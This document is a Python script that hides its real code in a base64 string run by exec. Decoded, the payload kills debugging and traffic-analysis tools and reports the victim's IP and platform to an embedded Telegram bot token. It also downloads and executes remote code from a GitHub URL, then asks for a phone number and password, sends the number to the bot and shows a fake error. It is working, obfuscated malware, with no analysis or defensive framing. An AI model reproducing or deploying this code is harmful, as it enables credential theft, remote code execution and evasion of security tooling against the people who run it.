import base64;exec(base64.b64decode('ZnJvbSB0aW1lIGltcG9ydCBzbGVlcAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHBsYXRmb3JtLG9zCmltcG9ydCBwc3V0aWwKZnJvbSBzaWduYWwgaW1wb3J0IFNJR1RFUk0KCmlwID0gc3RyKHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikudGV4dCkKCmRlYnVnZ2VyPVsiYnVycHN1aXRlLmphciIsImRuU3B5LmV4ZSIsIkhUVFBEZWJ1Z2dlclVJLmV4ZSIsIkZpZGRsZXIuZXhlIiwiTWVnYUR1bXBlci5leGUiLCJQcm9jZXNzSGFja2VyMi5leGUiLCJQcm9jZXNzIEhhY2tlciAyLmV4ZSIsImZpZGRsZXIiLCJmaWRkbGVyLmV4ZSIsImNoYXJsZXMiLCJjaGFybGVzLmV4ZSIsImRlYnVnZ2VyIiwiZGVidWdnZXIuZXhlIiwiaHR0cGRlYnVnIiwiaHR0cGRlYnVnLmV4ZSIsImdoaWRyYSIsImdpaGRyYS5leGUiLCJzbXNuaWZmIiwic21zbmlmZi5leGUiLCJjb2RlY3JhY2tlciIsImNvZGVjcmFja2VyLmV4ZSIsImJ1cnBzdWl0ZSIsImJ1cnBzdWl0ZS5leGUiLCJ3aXJlc2hhcmsiLCJ3aXJlc2hhcmsuZXhlIiwiZHVtcCIsImR1bXAuZXhlIiwiQ3JhY2siLCJDcmFjay5leGUiLCJodHRwIiwiaHR0cC5leGUiLCJhaXJzbmFyZSIsImFpcnNuYXJlLmV4ZSIsIkhhY2siXQpkZWYgYW50aSgpOiAKICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJMaW51eCI6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBkYXRhID0gWyhpbnQocCksIGMpIGZvciBwLCBjIGluIFt4LnJzdHJpcCgnXG4nKS5zcGxpdCgnICcsIDEpIFwKICAgICAgICAgICAgZm9yIHggaW4gb3MucG9wZW4oJ3BzIGggLWVvIHBpZDoxLGNvbW1hbmQnKV1dCiAgICAgICAgICAgIGZvciBpIGluIGRlYnVnZ2VyOgogICAgICAgICAgICAgICAgaWYgaSBpbiBzdHIoZGF0YSk6CiAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU0OTIyNzQ2NTk6QUFIakVYemRxTEgzODN2bEpqRVBrNldiTXNDcWlUd0syc2Mvc2VuZE1lc3NhZ2U/Y2hhdF9pZD01MDAwMjE0Nzc2JnRleHQ9TmV3IGJhYnlcbklQIDoge2lwfVxucGxhdGZvcm0gOiAnK3BsYXRmb3JtLnN5c3RlbSgpKQogICAgICAgICAgICAgICAgICAgIG9zLmtpbGwob3MuZ2V0cGlkKCksIFNJR1RFUk0pCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgICAKICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKToKICAgICAgICBpZiBwcm9jLm5hbWUoKSBpbiBkZWJ1Z2dlcjoKICAgICAgICAgICAgcHJvYy5raWxsKCkKICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU0OTIyNzQ2NTk6QUFIakVYemRxTEgzODN2bEpqRVBrNldiTXNDcWlUd0syc2Mvc2VuZE1lc3NhZ2U/Y2hhdF9pZD01MDAwMjE0Nzc2JnRleHQ9TmV3IGJhYnlcbklQIDoge2lwfVxucGxhdGZvcm0gOiAnK3BsYXRmb3JtLnN5c3RlbSgpKQogICAgICAgICAgICBvcy5raWxsKG9zLmdldHBpZCgpLCBTSUdURVJNKQogICAgICAgICAgICBleGl0KCkKICAgICAgICAKICAgICAgICBlbHNlOnBhc3MKCmFudGkoKQoKaWYgIjEiIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dwZW85ZGxrZ2IvZnVja2VyL21haW4vY2sudHh0IikudGV4dDoKICAgIGZvciBpIGluIHJhbmdlKDUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgIGV4ZWMocmVxdWVzdHMuZ2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZ3BlbzlkbGtnYi9mdWNrZXIvbWFpbi9wcm8ucHkiKS50ZXh0KQogICAgICAgICAgICAgYnJlYWsKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1NDkyMjc0NjU5OkFBSGpFWHpkcUxIMzgzdmxKakVQazZXYk1zQ3FpVHdLMnNjL3NlbmRNZXNzYWdlP2NoYXRfaWQ9NTAwMDIxNDc3NiZ0ZXh0PUZhaWxlZCB0byBleGVjJykKCgpudW1iZXIgPSBpbnB1dCgiRW50ZXIgeW91ciBudW1iZXIiKSAgIApyZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTQ5MjI3NDY1OTpBQUhqRVh6ZHFMSDM4M3ZsSmpFUGs2V2JNc0NxaVR3SzJzYy9zZW5kTWVzc2FnZT9jaGF0X2lkPTUwMDAyMTQ3NzYmdGV4dD0nK251bWJlcikKCnBhc3N3byA9IGlucHV0KCJFbnRlciB5b3VyIHBhc3N3b3JkIikgCgpzbGVlcCgzKQpwcmludCgiRXJyb3IgaW4geW91ciBudW1iZXIgb3IgcGFzc3dvcmQgdHJ5IGFnYWluIGxhdGVyISIp'))
